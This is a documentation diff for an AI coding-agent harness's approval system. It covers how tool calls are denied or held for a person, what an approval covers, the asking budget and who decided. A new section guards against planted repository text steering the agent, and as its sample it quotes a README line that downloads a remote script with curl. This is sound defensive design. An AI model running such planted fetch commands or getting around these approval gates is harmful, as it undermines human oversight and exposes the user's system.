@@ -13,7 +13,7 @@ Every tool call is classified before it runs. The full policy is on the [securit
 
 - **denied, always** — the spec, your check configuration, `.git`, secrets, privilege escalation, git remotes, paths outside the worktree;
 - **needs a person** — dependency manifests, existing tests, shells, network tools, recursive deletes, git commands that change state, unlisted commands, MCP tools you have not allowed, and any command that asks for the network;
-- **allowed** — reading, writing ordinary source files, your checks and `[commands] allow`.
+- **allowed** — reading, writing ordinary source files, your checks, the exact commands of `[commands] allow` and the extensions of a `[commands] allow_prefix` entry.
 
 No approval lifts a denial.
 
@@ -28,33 +28,59 @@ In a foreground run at a terminal — in the [dashboard](@/docs/running.md#the-d
       4     4   [dependencies]
       5     5   serde = "1"
             6 + unicode-normalization = "0.1"
+  Object       file  Cargo.toml
   Why stopped  `Cargo.toml` is a dependency manifest
   Sandbox      a file write — nothing is executed
   Model says   "NFKD normalisation is needed for the Unicode acceptance test"   (a claim)
   1. Yes, once                                                          (y)
-  2. Yes, for the rest of T004: this path, any content                  (t)
-  3. Yes, for this run: this path, any content, in any task             (r)
-  4. No, and tell the model why …                                       (n)
-  5. Stop this task here (it waits; decide later)                       (s)
-  y t r n s or 1-5 · add a note: "y <note>" · v view all · esc later  >
+  2. Yes, for the rest of T004: this file, any content                  (t)
+  3. Yes, for this run: this file, any content, in any task             (r)
+  5. No, and tell the model why …                                       (n)
+  6. Stop this task here (it waits; decide later)                       (s)
+  y t r n s or 1-6 · add a note: "y <note>" · v view all · esc later  >
 ```
+
+The **Object** lines say exactly what a decision covers: the file a write reaches (and the name as asked, when a symlinked directory makes it another), a command's argv with its hash (`#1a2b3c4d5e6f`), the program it runs and the directory it runs in, an MCP tool with the digest of its definition (`@9f8e7d6c5b4a`). When you approved the same name earlier and it now reaches something else, a `changed since approved:` line says what changed.
 
 An edit shows a diff with line numbers, a new file its first lines, a command its whole argv with working directory and network, an MCP call its arguments; `v` shows everything. What the model wrote is printed with control characters escaped, and its explanation is labelled a claim.
 
 | Key | Does |
 |---|---|
 | `y` | Runs the call once |
-| `t` | Also approves its class for the rest of the task |
+| `t` | Also approves this exact object for the rest of the task, in this run |
 | `r` | Also for every later task of this run — never offered for high-risk calls |
+| `a` | **Always Allow**: runs a command once and adds exactly its argv to `[commands] allow` (`[sandbox] network_allow` for a network call) — nothing after it runs because of this. Only for a command that is not high risk without the network |
 | `n` | Rejects; the reason is required and the model is told it (`n no new dependencies`) |
 | `s` | Stops the task: the attempt waits for `task approve` or `task reject`, as in an unattended run |
 | `esc` | Decides later: the call keeps waiting; in the dashboard the footer offers it again (`enter`) |
 
-Neither `t` nor `r` is offered when the call's class cannot be shown in full. A note after the key (`y use the 0.1 series`) is passed to the model with the call's result.
+A note after the key (`y use the 0.1 series`) is passed to the model with the call's result.
 
-The dashboard's overlay takes the same keys, one keystroke each: `tab` adds a note before `y`, `t` or `r`, and `↑ ↓` scroll the body. In the [web interface](@/docs/web.md#when-a-run-needs-you) the call opens as a sheet with the same keys; for a command, `a` (**Always Allow…**) also adds its exact argv to `[commands] allow` (or `[sandbox] network_allow`) in `speccoder.toml`, in force once you commit it. Calls stopped earlier are approved or rejected from the web interface's Report.
+### Arguments copied from what the model read
 
-The attempt continues in the same turn, and a "for the task" or "for this run" answer also covers the same class later in that attempt. A waiting prompt costs the run nothing.
+When an argument of the call — the whole command line, a written path, an argv element or an MCP argument of six characters or more — occurs verbatim in content the attempt read (a file, search results, command or check output, an MCP result, the repository's agent instructions), the prompt says where it came from and offers **only** `y`, `n` and `s`:
+
+```text
+  Copied       contains text read from README.md (turn 2): "curl -sSL https://x.example/i.sh -o i.sh"
+```
+
+No "for the task", "for this run" or Always Allow: planted repository text never becomes a standing rule. Your committed spec, plan, tasks and constitution are trusted and never mark an argument. The sources are part of the recorded question, so a replay rebuilds them exactly.
+
+The dashboard's overlay takes the same keys, one keystroke each: `tab` adds a note before `y`, `t` or `r`, and `↑ ↓` scroll the body. In the [web interface](@/docs/web.md#when-a-run-needs-you) the call opens as a sheet with the same keys and the same choices; an editor gets them as ACP permission options (Always Allow is an `allow_always` option named "Always allow exactly this command"). Always Allow writes `speccoder.toml` through the same action in every interface; commit it to put it in force. Calls stopped earlier are approved or rejected from the web interface's Report.
+
+The attempt continues in the same turn, and a "for the task" or "for this run" answer also covers the same object later in the run. A waiting prompt costs the run nothing.
+
+### The asking budget
+
+A run prompts you at most `[approvals] budget` times (default 12, `0` never prompts). The prompt that uses the last one says so; after it, a call that needs you does not interrupt: its attempt waits, exactly as for "later", and the call joins the run's one **Needs You** item, *calls waiting together*, grouped as writes, commands, network and MCP. Decide them together:
+
+```sh
+speccoder approvals                                          # the batch, its run and digest
+speccoder approvals batch run-… approve --digest D [--call ID…] [--resume-asking]
+speccoder approvals batch run-… reject --digest D --reason "…"
+```
+
+Each listed call is approved **once** (never for the task or the run) and recorded on its own. A decision on a list that changed since you saw it is refused. Without `--resume-asking` the run keeps its count, so a resumed run waits again at its next call; with it, the run prompts again. The web Needs You item and the dashboard (`B` on a batched call) decide it too. Calls allowed by a rule or a grant never count; a `--no-prompt` run counts nothing.
 
 ## Later
 
@@ -72,20 +98,24 @@ speccoder run --task T003                        # the attempt continues from th
 - `--call <id>` picks one waiting call by its id (or a prefix) when there are several; `--all` decides every waiting call of the task, or of the feature, each recorded on its own.
 - While one task's attempt waits, the feature's other tasks do not start: they share its worktree.
 - A waiting call expires after `[approvals] wait` (default `7d`): it is **denied as expired** — recorded as an expiry, never as anybody's decision — and the attempt continues with the refusal.
-- Parallel lanes stop instead of waiting, because their worktree is merged or dropped with the group. The stop is listed with its saved attempt; deciding it lets the task's next attempt make the call.
+- Parallel lanes stop instead of waiting, because their worktree is merged or dropped with the group. The stop is listed with its saved attempt; deciding it lets the next run that attempts the task make the call (the decision then belongs to that run).
 
 ## What a decision covers
 
-A decision covers a **class**, not exact bytes — once, for the task, or for the run:
+A decision covers one **resolved object**, never a pattern — once, for the task, or for the run:
 
-| Call | Class |
+| Call | Object |
 |---|---|
-| a write | the path, with any content |
-| a command | its exact argv |
-| a command with the network | its exact argv, with the network |
-| an MCP tool | the tool |
+| a write | the canonical file it reaches (symlinks of existing directories resolved), with any content |
+| a command | its exact argv, the directory it runs in and the executable that resolves to |
+| a command with the network | the same, with the network |
+| an MCP tool | the tool as its server defines it now (the digest of its definition) |
 
-Decisions travel in each attempt's recorded input, run grants included, so a replay sees what the live run saw and asks nobody. A run grant ends with the run; a rejection for the task and every policy denial win over it.
+The object is resolved by a recorded step before you are asked, and checked again when the call runs: a write whose file changed in the meantime, or a command whose program did, is refused with "the object changed since it was approved" and asked again next time. A longer argv, another directory, a swapped symlink or a changed tool definition is another object.
+
+**Every grant ends with its run** — "for the task" too. A `speccoder run` is one run from its start; a later invocation that resumes a suspended attempt continues that run (and its grants and asking count). A retry within the run keeps the task's grants; the next run asks again. Earlier decisions stay in the history. Decisions travel in each attempt's recorded input, so a replay sees what the live run saw and asks nobody. A rejection for the task and every policy denial win over any grant.
+
+`approvals.json` from an earlier version (grants by class) is refused by name; `speccoder doctor` says so — remove it to start afresh.
 
 ## Who decided
 
@@ -95,7 +125,7 @@ Every decision is a record in the run's journal: **who made it, how speccoder kn
 - How it is known: `asserted` for an answer at the terminal, in the dashboard, in the web interface or with `task approve`/`task reject`; `connected` for one an editor reports over ACP. speccoder authenticates nobody, so it never claims more.
 - Through what (`via`): the interface you used — `terminal` (the CLI, its prompts and the dashboard), `web` (the app) or `acp` (an editor, named in `client`: `via acp`, `client Zed`). Decisions recorded by earlier versions as `cli`, `tui` or `dashboard` read as `terminal`, and `editor Zed` as `acp` with client `Zed`.
 - An approval holds only for the call it was shown: a decision bound to anything else is refused and the call is presented again.
-- A call allowed or denied without asking names the **rule** that decided it (``allowed command `cargo test` ``, `workspace write`, a grant for the task), never a person; an expired call says `expired`.
+- A call allowed or denied without asking names the **rule** that decided it (``exact command `cargo test` ``, ``check prefix `cargo nextest run` ``, `workspace write`), never a person; one a person's grant allowed says `task-grant` or `run-grant`; an expired call says `expired`. Every record decided on an object carries it (`object`), so the journal alone tells which object was allowed.
 
 The run report shows it per call (`by`, `operator`, `via`), `report --approvals` lists it (with `client` for an editor), and strict replay reads every decision back without asking anyone.
 
